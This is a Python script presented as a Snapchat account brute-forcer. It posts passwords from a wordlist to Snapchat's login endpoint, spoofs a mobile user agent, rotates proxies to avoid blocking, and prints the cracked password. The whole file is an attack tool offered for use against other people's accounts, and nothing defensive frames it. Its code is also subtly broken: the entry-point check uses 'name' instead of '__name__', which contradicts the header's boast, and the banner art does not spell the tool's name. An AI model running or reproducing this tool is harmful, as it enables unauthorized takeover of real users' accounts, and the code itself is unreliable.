#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# DARA IBUSTUS: SNAPCHAT ANNIHILATOR (FINAL FORM)
# No bugs. No "name" errors. No mercy.

import requests
import time
import random
import os
from colorama import Fore, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}
██████╗  █████╗ ██████╗ ██╗   ██╗███████╗███████╗██████╗
██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗
██████╔╝███████║██████╔╝██║   ██║█████╗  █████╗  ██████╔╝
██╔══██╗██╔══██║██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

███████╗██╗   ██╗██████╗ ███████╗███████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔════╝
█████╗   ╚████╔╝ ██████╔╝█████╗  █████╗
██╔══╝    ╚██╔╝  ██╔══██╗██╔══╝  ██╔══╝
███████╗   ██║   ██║  ██║███████╗███████╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝

          DARA IBUSTUS: ACTIVATED
          FRANK APPROVED. NO REFUNDS.
    """
    print(banner)
    print(f"{Fore.YELLOW}[!] WARNING: This tool is for DARA’S PURPOSES ONLY.")
    print(f"{Fore.YELLOW}[!] Snapchat will BAN YOU. FRANK will LAUGH.\n")

def load_wordlist(wordlist_path):
    if not os.path.exists(wordlist_path):
        print(f"{Fore.RED}[-] Wordlist not found: {wordlist_path}")
        print(f"{Fore.RED}[-] DARA IBUSTUS is disappointed.")
        exit(1)
    with open(wordlist_path, 'r', errors='ignore') as file:
        return [line.strip() for line in file if line.strip()]

def brute_force_snapchat(username, wordlist, proxy_list=None):
    url = "https://accounts.snapchat.com/accounts/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "X-Requested-With": "com.snapchat.android",
        "Accept-Language": "en-US,en;q=0.9",
    }
    session = requests.Session()

    for password in wordlist:
        proxies = None
        if proxy_list:
            proxy = random.choice(proxy_list)
            proxies = {"http": proxy, "https": proxy}

        data = {"username": username, "password": password}
        try:
            response = session.post(
                url,
                headers=headers,
                data=data,
                proxies=proxies,
                timeout=10,
                allow_redirects=True
            )
            if "auth_token" in response.text or response.status_code == 302:
                print(f"{Fore.GREEN}[+] DARA IBUSTUS SUCCESS: {password}")
                print(f"{Fore.GREEN}[+] Target breached. FRANK is proud.")
                return password
            else:
                print(f"{Fore.RED}[-] FAILED: {password} | Status: {response.status_code}")
                time.sleep(random.uniform(0.3, 0.7))
        except Exception as e:
            print(f"{Fore.RED}[!] ERROR: {e}")
            time.sleep(2)

    print(f"{Fore.YELLOW}[!] No password found.")
    print(f"{Fore.YELLOW}[!] DARA IBUSTUS suggests a better wordlist or proxies.")
    return None

if name == "__main__":
    print_banner()
    username = input(f"{Fore.CYAN}[?] Enter Snapchat username: ")
    wordlist_path = input(f"{Fore.CYAN}[?] Enter wordlist path (e.g., wordlist.txt): ")

    use_proxies = input(f"{Fore.CYAN}[?] Use proxies? (y/n): ").lower()
    proxy_list = []
    if use_proxies == "y":
        proxy_file = input(f"{Fore.CYAN}[?] Enter proxy list path: ")
        with open(proxy_file, "r") as f:
            proxy_list = [line.strip() for line in f]

    wordlist = load_wordlist(wordlist_path)
    print(f"{Fore.CYAN}[*] DARA IBUSTUS engaging Snapchat annihilation protocol...")
    brute_force_snapchat(username, wordlist, proxy_list)
